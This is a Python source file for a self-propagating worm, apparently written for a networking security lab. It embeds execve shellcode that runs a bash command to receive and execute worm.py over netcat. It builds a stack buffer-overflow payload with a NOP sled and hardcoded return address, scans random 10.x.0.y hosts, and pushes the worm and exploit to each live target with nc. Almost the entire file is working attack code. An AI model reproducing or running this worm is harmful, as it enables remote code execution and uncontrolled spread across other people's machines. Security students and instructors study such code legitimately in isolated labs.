#!/usr/bin/env python3
import os
import sys
import time
import fcntl
import subprocess
from random import randint

# The shellcode to be injected
shellcode = (
    # Binary code is represented as ASCII here
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "/bin/bash*"
    "-c*"
    " echo '(^_^) Shellcode is running (^_^)'; ping -q -i2 1.2.3.4 &    "
    " nc -lnv 8080 > worm.py & sleep 2; chmod +x worm.py; ./worm.py     "
    " *"
    "123456789012345678901234567890123456789012345678901234567890"
).encode('latin-1')

# Prevent self-infection by using a lock file
def preventSelfInfection():
    try:
        # Try to create and lock a file
        lockfile = open("/tmp/worm.lock", "w")
        fcntl.flock(lockfile, fcntl.LOCK_EX | fcntl.LOCK_NB)
        # If we get here, we have the lock
        return True
    except IOError:
        # Another instance already has the lock
        print("Another instance of the worm is already running. Exiting...", flush=True)
        sys.exit(0)

# Check if the machine is already infected
def isInfected():
    return os.path.exists('badfile')

# Create the badfile (the malicious payload)
def createBadfile():
    # Create a buffer filled with NOP instructions
    content = bytearray(0x90 for i in range(500))
    
    # Put the shellcode at the end of the buffer
    content[500-len(shellcode):] = shellcode
    
    # The buffer's address inside bof(): 0xffffd588
    # The frame pointer (ebp) inside bof(): 0xffffd5f8
    # Calculate the buffer overflow parameters
    buffer_addr = 0xffffd588
    frame_ptr = 0xffffd5f8
    
    # Point the return address to the middle of our NOP sled
    ret = buffer_addr + 100
    
    # Calculate the offset where we need to insert the return address
    # The return address is 4 bytes after the frame pointer
    offset = (frame_ptr - buffer_addr) + 4
    
    # Insert the return address at the calculated offset
    content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')
    
    # Save the binary code to file
    with open('badfile', 'wb') as f:
        f.write(content)

# Find the next victim (return an IP address)
def getNextTarget():
    # Generate random IP addresses based on the given pattern
    # IP addresses follow the pattern 10.X.0.Y 
    # where X ranges from 150 to 180 and Y ranges from 70 to 100
    x = randint(150, 180)
    y = randint(70, 100)
    ip = f"10.{x}.0.{y}"
    
    # Check if the target is alive
    try:
        output = subprocess.check_output(f"ping -q -c1 -W1 {ip}", shell=True)
        result = output.find(b'1 received')
        if result != -1:
            print(f"*** {ip} is alive, launching attack", flush=True)
            return ip
    except:
        pass
    
    # If we get here, the target is not alive or the ping failed
    # Recursively call getNextTarget() to find another target
    return getNextTarget()

# Main function to run the worm
def main():
    # Check if we're already infected to prevent self-infection
    if isInfected():
        print("This machine is already infected. Continuing with a new instance...", flush=True)
    else:
        print("First time infection on this machine", flush=True)
    
    # Acquire a lock to ensure only one instance runs
    preventSelfInfection()
    
    print("The worm has arrived on this host ^_^", flush=True)
    
    # Run the ping program in the background to make the node flash on the map
    subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)
    
    # Create the badfile for the attack
    createBadfile()
    
    # Main attack loop
    while True:
        # Get the next target
        targetIP = getNextTarget()
        
        # Send a copy of the worm to the target
        print(f"Setting up listener on target {targetIP}", flush=True)
        try:
            # Send the worm.py file to the target
            subprocess.run([f"nc -w5 {targetIP} 8080 < worm.py"],
                          shell=True, stdin=None, close_fds=True)
            
            # Send the malicious payload to the target
            print(f"Sending malicious payload to {targetIP}", flush=True)
            subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"],
                          shell=True, stdin=None, close_fds=True)
            
            # Sleep briefly to allow the worm to start on the target
            print(f"Attack completed on {targetIP}, sleeping before next attack", flush=True)
            time.sleep(5)
        except:
            print(f"Failed to attack {targetIP}", flush=True)
            time.sleep(1)

if __name__ == "__main__":
    main()